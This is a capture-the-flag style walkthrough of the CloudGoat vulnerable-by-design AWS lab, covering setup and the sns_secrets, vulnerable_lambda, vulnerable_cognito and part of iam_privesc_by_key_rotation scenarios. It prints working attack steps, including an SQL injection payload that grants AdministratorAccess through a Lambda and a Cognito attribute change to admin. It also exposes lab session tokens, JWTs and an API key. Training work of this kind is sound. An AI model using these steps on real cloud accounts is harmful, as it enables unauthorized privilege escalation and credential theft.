# CloudGoat - Walkthrough(☁️🐐)

**Table of Contents**

* [Requirements](#Requirements)
* [Optional Requirements](#optional-requirements)
* [Quick Start](#quick-start)
    * [Setup Free-tier AWS Account](#setup-free-tier-aws-account)
    * [Create AWS Access Key](#create-aws-access-key)
    * [Install Terraform](#install-terraform)
    * [Install AWS CLI](#install-aws-cli)
    * [Install CloudGoat](#install-cloudgoat)
* [Scenarios Tackled](#scenarios-tackled)
    * [sns_secrets (Small / Easy)](#sns_secrets-small--easy)
      * [Setup Scenario](#setup-scenario)
      * [Walkthrough](#walkthrough)
      * [Root causes](#root-cause)
    * [vulnerable_lambda (Small / Easy)](#vulnerable_lambda-small--easy)
      * [Setup Scenario](#setup-scenario-1)
      * [Walkthrough](#walkthrough-1)
      * [Root causes](#root-cause-1)
    * [vulnerable_cognito (Small / Moderate)](#vulnerable_cognito-small--moderate)
      * [Setup Scenario](#setup-scenario-2)
      * [Walkthrough](#walkthrough-2)
      * [Root causes](#root-cause-2)
    * [iam_privesc_by_key_rotation (Small / Easy)](#iam_privesc_by_key_rotation-small--easy)
      * [Setup Scenario](#setup-scenario-3)
      * [Walkthrough](#walkthrough-3)
      * [Root causes](#root-cause-3)
* [Disclaimer](#disclaimer)

## Requirements

* Linux or MacOS. Windows is not officially supported.
  * Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).
* Python3.6+ is required.
* Terraform >= 0.14 [installed and in your $PATH](https://learn.hashicorp.com/terraform/getting-started/install.html).
* The AWS CLI [installed and in your $PATH](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html), and an AWS account with sufficient privileges to create and destroy resources.
* [jq](https://stedolan.github.io/jq/)

## Optional Requirements
* PACU 
   ```
   mkdir pacu && cd pacu
   python3 -m venv venv && source venv/bin/activate
   ```

## Quick Start

### Setup Free-tier AWS Account
1. Navigate to the AWS Console sign-up page: AWS Console - Signup (amazon.com) 
2. Add an email address and account name, then click the "Verify email address" button. 
3. Enter the verification code that was sent to your email, then click the "Verify" button. 
4. On the next page, set your "Root user password" - make sure this is a strong and complex password - then click "Continue". 
5. Fill out your contact information, and mark that you are using AWS for "Personal" projects. 
6. Fill out your billing information on the next page. Almost all the CloudGoat scenarios can be completed for free, but providing billing information is required to set up an AWS account. Click "Verify and Continue" when finished. 
7. For the support plan, you can sign up for "Basic support" as that is completely free. 
8. Finally, click the "Complete sign up" button and log into your new AWS account!  


### Configure IAM
1. Navigate to the IAM Management Console: IAM Management Console (amazon.com)
2. Click "Users" on the left side under "Access management". 
Click the "Add Users" button in the top right of the page. 
3. Set your "User name" - this can be any unique value - and click "Next". 
4. Make sure "Add user to group" is selected and then click "Create group." 
5. For the "User group name", this can be any value. We recommend user "Administrator" so that it's clear the permissions the group has. 
6. Mark the "AdminstratorAccess" policy name and click "Create user group". 
7. Make sure you select the "administrator" group you just created and click the "Next" button. 
8. Finally, click the "Create user" button on the bottom of the page. 

### Create AWS Access Key
1. Click on the user you created in the previous task. 
2. Click "Security Credentials" tab for the user. 
3. Scroll down to "Access keys" and then click "Create access key". 
4. Select "Command Line Interface (CLI)" and click the "Next" button. You may be prompted with alternatives, just mark that you understand and continue the process. 
5. On the "Description tag value", this can be anything you want. I would recommend tagging it with "cloudgoat". Click "Create access key". 
6. Copy the "Access key" and "Secret access key". This is the only time you will be able to retrieve the secret access key. Do not leave this page until you have copied this information. 

### Install Terraform

1. Download the Terraform Binary for Kali Linux: [Terraform_1.5.0_Linux](https://releases.hashicorp.com/terraform/1.5.0/terraform_1.5.0_linux_amd64.zip)  
Unzip the package.
2. Type this command: sudo mv terraform /usr/local/bin
Verify Terraform is installed by typing: ```terraform --version``` 

### Install AWS CLI
1. Copy these commands into your terminal:
   ```
   curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
   unzip awscliv2.zip
   sudo ./aws/install
   ```
2. Verify AWS CLI is installed by typing: `aws --version`


### Install CloudGoat
1. To install CloudGoat, make sure your system meets the requirements above, and then run the following commands:

   ```
   git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
   cd cloudgoat
   pip3 install -r ./requirements.txt
   chmod +x cloudgoat.py
   ```
2. Configure your profile with the following command. When prompted, type "cloudgoat" as the profile name. 
`./cloudgoat.py config profile`

3. Whitelist IP for scenarios 
`$ ./cloudgoat.py config whitelist --auto`


## Scenarios Tackled

### sns_secrets (Small / Easy) 
In this scenario, you start with basic access to an AWS account. You need to enumerate your privileges, discover an SNS Topic you can subscribe to, retrieve a leaked API Key, and finally use the API Key to access an API Gateway for the final flag.  

[Visit Scenario Page.](scenarios/sns_secrets/README.md) 

Contributed by [Tyler Ramsbey.](https://youtube.com/@TylerRamsbey)
#### Setup Scenario
1. Run the following command
`$ ./cloudgoat.py create sns_secrets`

2. Configure AWS profile `aws configure --profile sns-secrets`
   Enter the access key and secret key given when creating scenario. You may leave region name and output format as empty.
   ![Configure Profile](images/sns_secrets/image1.png)

3. Run this command to verify if profile has been setup (akin to whoami) `aws sts get-caller-identity --profile sns-secrets`

   Result:
   ![whoami](images/sns_secrets/image2.png)

#### Walkthrough
1. Start by enumerating the policies that sns_secrets hold
`aws iam list-user-policies --username cg-sns-user-sns_secrets_cgidomg0yotdx7 --profile sns-secrets`
Result:
![Enumerate Policy](images/sns_secrets/image3.png)

2. Notice there's one policy attached to user. Let's enumerate the functions of the policy
`aws iam get-user-policy --user-name cg-sns-user-sns_secrets_cgidomg0yotdx7 --policy-name cg-sns-user-sns_secrets_cgidomg0yotdx7 --profile sns-secrets`
Result: 
![Policy Function](images/sns_secrets/image4.png)
Scrolling down, we can see the functions that the policy holds
![Functions](images/sns_secrets/image5.png)

3. Let's breakdown the actions. SNS is similiar to [GCP pub/sub topic](https://cloud.google.com/pubsub/docs/create-topic). As such, we know the actions user can subscribe, receive and list topics. Using PACU, it can help automate the enumeration process.
`pacu`

4. Import current keys config into PACU
`import_keys sns-secrets`

5. Enumerate SNS actions `search sns`
   Result:
   ![Enum sns](images/sns_secrets/image7.png)

6. Subscribe to all SNS topic
`run sns__subscribe --all --email <redacted>`

7. A confirmation email will be sent
![confirmation email](images/sns_secrets/image15.png)
Another email containing API Gateway Key will be sent in another minute 
![gateway key](images/sns_secrets/image16.png)

8. Enumerate API gateways. Only 1 will be shown
`aws apigateway get-rest-apis --profile sns-secrets --region us-east-1`
Result: 
![api gateway](images/sns_secrets/image12.png)

9. Probe further to obtain stage name and path
Obtain stage name:
`aws apigateway get-stages --rest-api-id 40ga6hov93 --profile sns-secrets --region us-east-1`
Result:
![stage name](images/sns_secrets/image17.png)
Obtain path:
`aws apigateway get-resources --rest-api-id 40ga6hov93 --profile sns-secrets --region us-east-1`
Result
![path](images/sns_secrets/image18.png)

10. Now that we have API key and path, let's query it using CURL. We can use this format from [AWS documentation](https://docs.aws.amazon.com/apigateway/latest/developerguide/how-to-call-api.html)
`https://<api-id>.execute-api.region.amazonaws.com/<stage>/<pathname>`
As such, we can query the information
`curl -X GET 'https://40ga6hov93.execute-api.us-east-1.amazonaws.com/prod-sns_secrets_cgidomg0yotdx7/user-data' -H 'x-api-key: 45a3da610dc64703b10e273a4db135bf' | json_pp`
Result: 
![flag](images/sns_secrets/image14.png)

#### Root causes
- Insufficient access control: User may not have access to subscribe to topic
- Sensitive items in LOG: API gateway key is found in debug pub/sub topic

### vulnerable_lambda (Small / Easy)
In this scenario, you start as the 'bilbo' user. You will assume a role with more privileges, discover a lambda function that applies policies to users, and exploit a vulnerability in the function to escalate the privelages of the bilbo user in order to search for secrets. 

[Visit Scenario Page.](scenarios/vulnerable_lambda/README.md)

#### Setup Scenario
1. Run the following command
`$ ./cloudgoat.py create vulnerable_lambda`

2. Configure AWS profile `aws configure --profile bilbo`
   Enter the access key and secret key given when creating scenario. You may leave region name and output format as empty.

3. Run this command to verify if profile has been setup (akin to whoami) `aaws --profile bilbo --region us-east-1 sts get-caller-identity`

   Result:
   ![whoami](images/vulnerable_lambda/image1.png)

#### Walkthrough
1. Enumerate policy attached to user `aws --profile bilbo --region us-east-1 iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgid1a3yt0x76e`
Result:
![list policy](images/vulnerable_lambda/image2.png)

2. Check functions of the policy `aws --profile bilbo --region us-east-1 iam get-user-policy --user-name cg-bilbo-vulnerable_lambda_cgid1a3yt0x76e --
policy-name cg-bilbo-vulnerable_lambda_cgid1a3yt0x76e-standard-user-assumer
`
Notice that user can list and roles.
![policy actions](images/vulnerable_lambda/image3.png)

3. List all available roles `aws --profile bilbo --region us-east-1 iam list-roles`
Result: 
![all roles](images/vulnerable_lambda/image1.png)

4. List role policy for role **cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e**
`aws --profile bilbo --region us-east-1 iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e`
Result
Notice a policy name: **lambda invoker** is attached to role **cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e**
![list role policy](images/vulnerable_lambda/image5.png)

5. Assume role **cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e**
   ```
   aws --profile bilbo --region us-east-1 sts assume-role --role-arn arn:aws:iam::536697256593:role/cg-lambda-invoker-vulnerable_lambda_cgid1a3yt0x76e --role-session-name cloudgoat
   ```
Result
![assume role](images/vulnerable_lambda/image6.png)

6. Configure a new profile for the newly obtained **AccessKey**, **SecretAccessKey** and **SessionToken**.
``aws configure --profile cloudgoat``
![configure new profile](images/vulnerable_lambda/image7.png)
Set session token into new profile
   ```
   aws configure set aws_session_token FwoGZXIvYXdzEAUaDIZ8UAGCT1uyPQrryyKtATsy66OE5lvcQIGoWYBcixUTqEIOloqB85T/0xkTlN0CATw7F7guD2Yy+Sc9R/acrKVs1H64MEuWLgGu/rpEnIPWzZZrQ2aArKumQM9KX+z81cYfvUbUyL1aaE3yiGN+nAIM/aPTn6OMHzwjigjAcKTb0K7Lif6+F525fWqeem0aOL9kbjP3fG/SMCBV+fgyTIim5vrdWlJqkTq/+qv9hAXcSNkou0S2D7dzVA9zKJjeyLwGMi3VJmPe39D0mskfEKIwEdjmMiRXgRLDFr4G6PA5yWv2vyq7Dt4MZNOzD5cGQIw= --profile cloudgoat
   ```

7. Using the new profile, list all functions
`aws --profile cloudgoat --region us-east-1 lambda list-functions`
Result:
![list function](images/vulnerable_lambda/image8.png)

8. Check function description. Notice that function communicate with database.
![Function description](images/vulnerable_lambda/image9.png)
Scrolling down, notice that there's a URL to download the function source code.
![Function source code](images/vulnerable_lambda/image10.png)

9. Download source code and rename it to a zip file format.
   ```
   #Download source code
   wget "https://prod-iad-c1-djusa-tasks.s3.us-east-1.amazonaws.com/snapshots/536697256593/vulnerable_lambda_cgid1a3yt0x76e-policy_applier_lambd
   a1-cc95b95d-26d0-4a96-8dde-b834e3cbbece?versionId=osghzlAUdDyANBSf.xi2F6o23dMrboVJ&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIESe0NfIpE2j6nAXdybtERrupc2tUEbc
   PlREX0zQtwLpAiEAg4%2F%2FdnosFZHrYgn%2FfSrZOvjyVYot5bDatQnCDLrejh8qkgII4%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAEGgw0NzkyMzMwMjUzNzkiDNXrg5bf6znOgtbtxyrmAXwrSYoEQxFy8fDLbrmuK%2B3Bp0RPdumqZBh8tVM3kRg6kBU%2FsWBgU2M3
   OF4CZoPCauDhTtIa70zDPb2iIUg4ej4%2BgbfmoWtUXy6zA%2BMcxvA0X5R%2B3RbwWqhrFYGtghaJqnNcZIrgh3p4Z%2Bj38llGDElAucl%2BvN34e%2FrIN%2FS54gxhzASie9wnchbqSaTy1hKG6kNjUXVS5yHTtPcx251YBaxUGAdiG%2BuX3DRGXfzN1%2BwQTwoiKro4Bg
   ovVdPZSsSeOxm2SXBuFxyIFCqkUF4JXCIigsN8VwzK0DSzsMRAo4kVpfP37RA%2BMNXIxrwGOo8B6rzOG4lDCkjVQs%2BTwthgThgcel81BSOzk%2Bb21od1gxe5sLSMk5qzRjIT3S2FdyhSqF7vL1mQPqElEZGmot3fIob7qn23n7b9%2F0OLcZ3iiF%2F0FoFReRZ83vRdciqY
   5Xa4cXX52sHXxkzQuWdgA7VU519SpeMJANt%2Fg4eS7d%2BvqzTc3thJldnoM8dKGZXCyfo%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20250123T123530Z&X-Amz-SignedHeaders=host&X-Amz-Expires=600&X-Amz-Credential=ASIAW7FEDUVR
   V7KFUM6G%2F20250123%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=b745aca9e763dcde66f58e274e4f3d59a6b0a581821814e28107e52ee08f4e2e"

   #Rename to zip file format
   mv vulnerable_lambda_cgid1a3yt0x76e-policy_applier_lambda1-cc95b95d-26d0-4a96-8dde-b834e3cbbece\?versionId\=osghzlAUdDyANBSf.xi2F6o23dMrboVJ\
   &X-Amz-Security-Token\=IQoJb3JpZ2luX2VjEOv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIESe0Nf "function.zip"
   ```

10. Unzip the file `unzip function.zip -d ./function`
Let's break down the source code.
- To gain administrator access, **public** needs to be false
![soure code 1](images/vulnerable_lambda/image11.png)
- Unsafe sink for SQL injection is found. By injecting SQL payload here will negate **public='True'**
![source code 2](images/vulnerable_lambda/image12.png)
- The structure of the payload is as such
![source code 3](images/vulnerable_lambda/image13.png)

11. With all the information given, we can craft a SQL payload to grant bilbo administrator access. Create a .json file name **payload.json** and insert the following contents. 
      ```
      {
            "policy_names": ["AdministratorAccess'--"],
            "user_name": ["cg-bilbo-vulnerable_lambda_cgid1a3yt0x76e"]
      }
      ```

12. Send the payload as such
      ```
      #Send the payload, write result in out.txt
      aws --profile cloudgoat --region us-east-1 lambda invoke --function-name vulnerable_lambda_cgid1a3yt0x76e-policy_applier_lambda1 --payload file://./payload.json out.txt

      #Read output content
      cat out.txt
      ```
   Result
   ![payload](images/vulnerable_lambda/image15.png)

13. List secret and get flag
      ```
      aws --profile bilbo --region us-east-1 secretsmanager list-secrets
      ```
      Flag is at the of the username
      ![flag](images/vulnerable_lambda/image16.png)
#### Root Cause
- Source code was accessible 
- Did not sanitise user input or use any prepared statements


### vulnerable_cognito (Small / Moderate)
In this scenario, you are presented with a signup and login page with AWS Cognito in the backend. You need to bypass restrictions and exploit misconfigurations in Amazon Cognito in order to elevate your privileges and get Cognito Identity Pool credentials.

Contributed by [TrustOnCloud.](https://trustoncloud.com/)

[Visit Scenario Page.](scenarios/vulnerable_cognito/README.md)
#### Setup Scenario
1. Run the following command
`$ ./cloudgoat.py create vulnerable_cognito`

2. A webpage should be given and accessible

#### Walkthrough
1. Enumerating through the site, there are 2 pages - login and signup page. 
![signup](images/vulnerable_cognito/image1.png)
An error message will surface during a sign up as such.
![](images/vulnerable_cognito/image2.png)

2. Dig a little into the source code and you'll find some useful information as such.
![](images/vulnerable_cognito/image3.png)
![](images/vulnerable_cognito/image4.png)

3. Now that enumeration is done, let's sign up using AWS-CLI cognito rather than using a web interface. Using the command below will trigger a 2FA to email.
   ```
   aws cognito-idp sign-up --client-id 28ppp8lsd8tr0ariq2bg3u2onq --region us-east-1 --username zovytemu@teleg.eu --password Password123! --user-attributes '[{"Name":"given_name
   ","Value":"test01"},{"Name":"family_name","Value":"test01"}]'
   ```
   Confirmation code sent after signing up
   ![](images/vulnerable_cognito/image6.png)

4. Obtain the 2FA from email and send confirmation
   ```
   aws cognito-idp confirm-sign-up --region us-east-1 --client-id 28ppp8lsd8tr0ariq2bg3u2onq --username  zovytemu@teleg.eu --confirmation-code 761005
   ```

5. Once sign up is complete, login with your new credentials
![](images/vulnerable_cognito/image7.png)

6. Login success! However, you do not have admin access. There are no other paths in the web application.
![](images/vulnerable_cognito/image8.png)
Looking into localstorage, you will find a access code. This is issued to user upon login. Using the same access code, we can get user attributes
   ```
   aws cognito-idp get-user --access-token eyJraWQiOiJZdGpYU0h5WGU1bVpDb2lScTI3WkgxdWxwdlRcLzZlOU5HbHFDcFIwbmN4az0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xVm1SNU40a2giLCJjbGllbnRfaWQiOiIyOHBwcDhsc2Q4dHIwYXJpcTJiZzN1Mm9ucSIsIm9yaWdpbl9qdGkiOiJmN2JmNGVmOC1mNDlkLTRmMjMtYmZjNy0wNzYxMTY2MzZkOTkiLCJldmVudF9pZCI6ImM2YmZjODE4LWFmMGItNGVhMi1iNzlmLWJmZmE0NTBmMGMzMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3Mzc2NDI4MDQsImV4cCI6MTczNzY0NjQwNCwiaWF0IjoxNzM3NjQyODA0LCJqdGkiOiI5YjYzYWI3YS1jYzQ1LTRhMmQtOGZiMS02N2FkZGEwNWUwYWIiLCJ1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSJ9.usKVO02NZokIk6gLLnqo_22eT5mqdB29moUvYqdAzszi5VxCs9UruYtGyvmd5kuGyxiHFXW_DktWjLgpg2Z-ga1bmBJJHOlaahapBeSzU8sUgTq8tslqyUI_76GTwwjcpNJDYErpr5YHW_rwc9g-ToH-QzI3CohW0w203kHw-teXI6m_PSrZaMuBMIGCyZxzbgwuC4OPjQLdAFZ4GFpV_DAlxw3SJdh_0QzFKnOKmj3Q6XomBMSdjzCvAvDgorqR409GoaFiAjkJRK6cdGm7tehjon90muZq5zmrY_fbifWGKuuSvnL_BC0UUs-H6QzrZaEPaV2NDLajnMXKpi-x2Q --region us-east-1
   ```
   Result: 
   ![](images/vulnerable_cognito/image9.png)

   Using JWT decode:
   ![](images/vulnerable_cognito/image10.png)

7. Referencing from [AWS-CLI Cognito documentation](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-attributes.html), update custom attribute **custom:access** to **admin**
   ```
   aws cognito-idp update-user-attributes --access-token eyJraWQiOiJZdGpYU0h5WGU1bVpDb2lScTI3WkgxdWxwdlRcLzZlOU5HbHFDcFIwbmN4az0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xVm1SNU40a2giLCJjbGllbnRfaWQiOiIyOHBwcDhsc2Q4dHIwYXJpcTJiZzN1Mm9ucSIsIm9yaWdpbl9qdGkiOiJmN2JmNGVmOC1mNDlkLTRmMjMtYmZjNy0wNzYxMTY2MzZkOTkiLCJldmVudF9pZCI6ImM2YmZjODE4LWFmMGItNGVhMi1iNzlmLWJmZmE0NTBmMGMzMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3Mzc2NDI4MDQsImV4cCI6MTczNzY0NjQwNCwiaWF0IjoxNzM3NjQyODA0LCJqdGkiOiI5YjYzYWI3YS1jYzQ1LTRhMmQtOGZiMS02N2FkZGEwNWUwYWIiLCJ1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSJ9.usKVO02NZokIk6gLLnqo_22eT5mqdB29moUvYqdAzszi5VxCs9UruYtGyvmd5kuGyxiHFXW_DktWjLgpg2Z-ga1bmBJJHOlaahapBeSzU8sUgTq8tslqyUI_76GTwwjcpNJDYErpr5YHW_rwc9g-ToH-QzI3CohW0w203kHw-teXI6m_PSrZaMuBMIGCyZxzbgwuC4OPjQLdAFZ4GFpV_DAlxw3SJdh_0QzFKnOKmj3Q6XomBMSdjzCvAvDgorqR409GoaFiAjkJRK6cdGm7tehjon90muZq5zmrY_fbifWGKuuSvnL_BC0UUs-H6QzrZaEPaV2NDLajnMXKpi-x2Q --user-attributes '[{"Name":"custom:access","Value":"admin"}]' --region us-east-1
   ```

8. Check on user and notice that the custom attribute tag has been updated to admin.
   ```
   aws cognito-idp get-user --access-token eyJraWQiOiJZdGpYU0h5WGU1bVpDb2lScTI3WkgxdWxwdlRcLzZlOU5HbHFDcFIwbmN4az0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xVm1SNU40a2giLCJjbGllbnRfaWQiOiIyOHBwcDhsc2Q4dHIwYXJpcTJiZzN1Mm9ucSIsIm9yaWdpbl9qdGkiOiJmN2JmNGVmOC1mNDlkLTRmMjMtYmZjNy0wNzYxMTY2MzZkOTkiLCJldmVudF9pZCI6ImM2YmZjODE4LWFmMGItNGVhMi1iNzlmLWJmZmE0NTBmMGMzMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3Mzc2NDI4MDQsImV4cCI6MTczNzY0NjQwNCwiaWF0IjoxNzM3NjQyODA0LCJqdGkiOiI5YjYzYWI3YS1jYzQ1LTRhMmQtOGZiMS02N2FkZGEwNWUwYWIiLCJ1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSJ9.usKVO02NZokIk6gLLnqo_22eT5mqdB29moUvYqdAzszi5VxCs9UruYtGyvmd5kuGyxiHFXW_DktWjLgpg2Z-ga1bmBJJHOlaahapBeSzU8sUgTq8tslqyUI_76GTwwjcpNJDYErpr5YHW_rwc9g-ToH-QzI3CohW0w203kHw-teXI6m_PSrZaMuBMIGCyZxzbgwuC4OPjQLdAFZ4GFpV_DAlxw3SJdh_0QzFKnOKmj3Q6XomBMSdjzCvAvDgorqR409GoaFiAjkJRK6cdGm7tehjon90muZq5zmrY_fbifWGKuuSvnL_BC0UUs-H6QzrZaEPaV2NDLajnMXKpi-x2Q --region us-east-1
   ```
   Result:
   ![](images/vulnerable_cognito/image13.png)

9. Relogging in will grant user admin access.
![](images/vulnerable_cognito/image14.png)

10. View source page get **IdentityPoolId**
![](images/vulnerable_cognito/image15.png)

11. Using new information, get identity id as such
   ```
   #Format
   aws cognito-identity get-id --region us-east-1 --identity-pool-id <IdentityPoolId> --logins "cognito-idp.<Region>.amazonaws.com/<UserPoolId>=<JWT>"

   #Actual Command
   aws cognito-identity get-id --region us-east-1 --identity-pool-id us-east-1:e0779a64-39ab-4de3-8347-567bd4fe7e30 --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_qVmR5N4kh=eyJraWQiOiJmZkpqYXNrcGIxNDRRN2RZVlVzTk9SSkFSWmFNZDVXa3VnWDB6bTQyaUVvPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfcVZtUjVONGtoIiwiY29nbml0bzp1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSIsImdpdmVuX25hbWUiOiJ0ZXN0MDEiLCJjdXN0b206YWNjZXNzIjoiYWRtaW4iLCJvcmlnaW5fanRpIjoiNGFiMWExNTAtMGRmNC00MTRhLWI5MWMtYWU0N2MyYmZjMTUzIiwiYXVkIjoiMjhwcHA4bHNkOHRyMGFyaXEyYmczdTJvbnEiLCJldmVudF9pZCI6IjVhYjdlYmIyLWNhMzItNGM4Zi04YTAzLTQyZDU5ODJmYzIwYyIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzM3NjQ0NDg3LCJleHAiOjE3Mzc2NDgwODcsImlhdCI6MTczNzY0NDQ4NywiZmFtaWx5X25hbWUiOiJ0ZXN0MDEiLCJqdGkiOiJmNTliYjVmYS00MDIwLTQyYzEtYjA4ZS00MDQ4NTA0ODBhNzMiLCJlbWFpbCI6Inpvdnl0ZW11QHRlbGVnLmV1In0.hgGGTqrCBhyU0a1-FTP2wh4ARXx2iQSlUhLWzsy-xDqrWvGfhKfJAVlcy2ICP_ys9u14A2r-LGDZu65I0WlYxIHSh3apilgUGeol4NhB2YmtczCiyc1JD_7aOPJiCn5WNnnLpGxy_5jQBb5Ahbyg1Y0RWjt1AZYsx9tJXS1sig_-kpJL0A24fpkG9pKOyymivXZ2wuBM06fO9C4nxpgKeFjxtri_vk3j12d1W9jvg0ydFkXpFrJDSCfztD2Gisd18H3MDLpQsLkCYRUsOzpWDoyUT9S-SMIq1RInIr9vB6CKsvob5Mh-53UJ8we7jBqRaFoghN4cBZZFm-6o0nLItQ"
   ```
   Result:
   ![](images/vulnerable_cognito/image17.png)

12. With identity ID, we can obtain credentials as such
   ```
   # Format
   aws cognito-identity get-credentials-for-identity --region us-east-1 --identity-id <IdentityId> --logins "cognito-idp.<Region>.amazonaws.com/<UserPoolId>=<JWT>"

   # Actual Command
   aws cognito-identity get-credentials-for-identity --region us-east-1 --identity-id 'us-east-1:7cf5a63a-918b-c3b0-c8cb-925fd9b10bde' --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_qVmR5N4kh=eyJraWQiOiJmZkpqYXNrcGIxNDRRN2RZVlVzTk9SSkFSWmFNZDVXa3VnWDB6bTQyaUVvPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfcVZtUjVONGtoIiwiY29nbml0bzp1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSIsImdpdmVuX25hbWUiOiJ0ZXN0MDEiLCJjdXN0b206YWNjZXNzIjoiYWRtaW4iLCJvcmlnaW5fanRpIjoiNGFiMWExNTAtMGRmNC00MTRhLWI5MWMtYWU0N2MyYmZjMTUzIiwiYXVkIjoiMjhwcHA4bHNkOHRyMGFyaXEyYmczdTJvbnEiLCJldmVudF9pZCI6IjVhYjdlYmIyLWNhMzItNGM4Zi04YTAzLTQyZDU5ODJmYzIwYyIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzM3NjQ0NDg3LCJleHAiOjE3Mzc2NDgwODcsImlhdCI6MTczNzY0NDQ4NywiZmFtaWx5X25hbWUiOiJ0ZXN0MDEiLCJqdGkiOiJmNTliYjVmYS00MDIwLTQyYzEtYjA4ZS00MDQ4NTA0ODBhNzMiLCJlbWFpbCI6Inpvdnl0ZW11QHRlbGVnLmV1In0.hgGGTqrCBhyU0a1-FTP2wh4ARXx2iQSlUhLWzsy-xDqrWvGfhKfJAVlcy2ICP_ys9u14A2r-LGDZu65I0WlYxIHSh3apilgUGeol4NhB2YmtczCiyc1JD_7aOPJiCn5WNnnLpGxy_5jQBb5Ahbyg1Y0RWjt1AZYsx9tJXS1sig_-kpJL0A24fpkG9pKOyymivXZ2wuBM06fO9C4nxpgKeFjxtri_vk3j12d1W9jvg0ydFkXpFrJDSCfztD2Gisd18H3MDLpQsLkCYRUsOzpWDoyUT9S-SMIq1RInIr9vB6CKsvob5Mh-53UJ8we7jBqRaFoghN4cBZZFm-6o0nLItQ"
   ```
   As such, we have obtain administrator access key, secret key and session ID
   ![](images/vulnerable_cognito/image18.png)

#### Root Cause
- Implement serverside validation for sign up so both frontend and backend are aligned.
- As update attributes can be called publicly, do not implement access control via attributes




### iam_privesc_by_key_rotation (Small / Easy)
Exploit insecure IAM permissions to escalate your access. Start with a role tha manages other users credentials and find a weakness in the setup to access the "admin" role. Using the admin role retrieve the flag from secretsmanager.

Contributed by [infrasec.sh](https://infrasec.sh/).

[Visit Scenario Page.](scenarios/iam_privesc_by_key_rotation/README.md)
#### Setup Scenario
1. Run the following command
`$ ./cloudgoat.py create iam_privesc_by_key_rotation`

2. Configure AWS profile `aws configure --profile manager`
   Enter the access key and secret key given when creating scenario. You may leave region name and output format as empty.


3. Run this command to verify if profile has been setup (akin to whoami) `aws sts get-caller-identity --profile manager`

   Result:
   ![](images/iam_privesc_by_key_rotation/image1.png)

#### Walkthrough
1. Enumerate policies attached to user. There are 2 policies found attached to user.
   ```
   aws --profile manager --region us-east-1 iam list-user-policies --user-name manager_iam_privesc_by_key_rotation_cgidm3vx44qe91
   ```

2. Check actions found in both policy.
**SelfManageAccess**
   ```
   aws --profile manager iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name SelfManageAccess
   ```
